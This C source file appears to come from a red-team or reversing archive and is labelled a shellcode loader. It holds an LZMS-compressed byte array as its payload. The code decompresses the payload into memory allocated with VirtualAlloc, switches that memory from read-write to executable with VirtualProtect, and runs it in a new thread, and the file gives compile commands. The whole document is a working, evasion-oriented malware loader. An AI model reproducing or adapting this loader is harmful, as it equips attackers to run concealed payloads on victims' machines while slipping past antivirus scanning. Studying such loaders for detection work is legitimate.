/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    Decompress
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <compressapi.h>
#include <stdint.h>

#pragma comment(lib,"cabinet")

int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t payload []  = { 0x0a,0x51,0xe5,0xc0,0x18,0x00,0xcf,0x05,0x14,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x14,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x01,0x00,0x00,0xd5,0x16,0x4f,0x6f,0xc9,0xce,0x24,0x68,0x15,0x20,0xaa,0xfe,0x26,0xd9,0x16,0x2a,0xd1,0x14,0x55,0xe6,0x45,0xfd,0x21,0x0d,0x57,0x73,0x00,0x00,0x00,0x00,0x00,0x40,0x19,0x5e,0x99,0xcb,0x18,0x5b,0xd8,0x58,0x95,0xd1,0x4e,0xac,0xfa,0x00,0xd4,0xde,0xe4,0x26,0x8e,0x76,0x0b,0xea,0xc0,0xf7,0x01,0x15,0xf8,0x0c,0x78,0x50,0x88,0x2b,0xb3,0xaa,0xb3,0xb7,0xd2,0xb4,0xb2,0x12,0xad,0x85,0xdf,0xad,0xfe,0x3f,0x7c,0x5b,0x8c,0xd1,0x0d,0xb2,0x02,0x1a,0x1b,0x91,0x32,0x80,0x00,0x5d,0xa4,0xae,0x4a,0xff,0xbf,0x4a,0x97,0x58,0xac,0x16,0x16,0x03,0xfc,0x5f,0x2a,0x08,0x84,0x7d,0x10,0x49,0x2b,0x28,0xcb,0xd2,0xca,0xf2,0xaa,0x76,0x2c,0x0b,0x20,0x21,0x12,0x54,0x0a,0x8b,0xc3,0x5a,0x20,0x31,0x54,0x2b,0x33,0x8b,0xc4,0xda,0xc2,0xc2,0xae,0x8b,0xce,0x29,0x42,0x20,0x61,0x1a,0x60,0x8a,0xaf,0x03,0xc7,0xd1,0xda,0xb4,0x39,0xeb,0xca,0x82,0x48,0xb3,0x18,0x94,0xfc,0x5f,0x09,0x8e,0x57,0x8a,0x24,0x10,0xa0,0x45,0x22,0x0c,0xa4,0x45,0x28,0xab,0x71,0x46,0x07,0x5c,0x88,0x64,0xd1,0x21,0x02,0x2e,0x42,0x07,0x20,0xf1,0x08,0x2d,0x5e,0xa5,0x4a,0x4c,0xaa,0x5d,0x3c,0x38,0x20,0xa8,0x21,0x39,0x38,0x08,0x84,0x45,0x80,0x2f,0x8c,0x87,0x15,0xb8,0xda,0x24,0xc7,0x34,0x29,0x29,0xdd,0x3e,0x20,0x41,0xc9,0x55,0x20,0x16,0x86,0xd5,0x83,0x49,0x2d,0x22,0x95,0x49,0xc7,0x20,0x59,0x45,0x49,0x41,0x05,0x45,0x05,0x55,0x00,0xc0,0xe8,0xf0,0xe4,0x83,0x48,0xfc };
    size_t  compressed_len = 286;
    size_t  payload_len;

    DECOMPRESSOR_HANDLE engine;

    // create LZMS decompressor
    CreateDecompressor (COMPRESS_ALGORITHM_LZMS, NULL, &engine);

    // allocate memory buffer for payload as READ-WRITE (no executable)
    // first, query the size of decompressed data
    Decompress (engine, payload, compressed_len, NULL, 0, &payload_len);
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    Decompress (engine, payload, compressed_len, runtime, payload_len, &payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    return 0;
}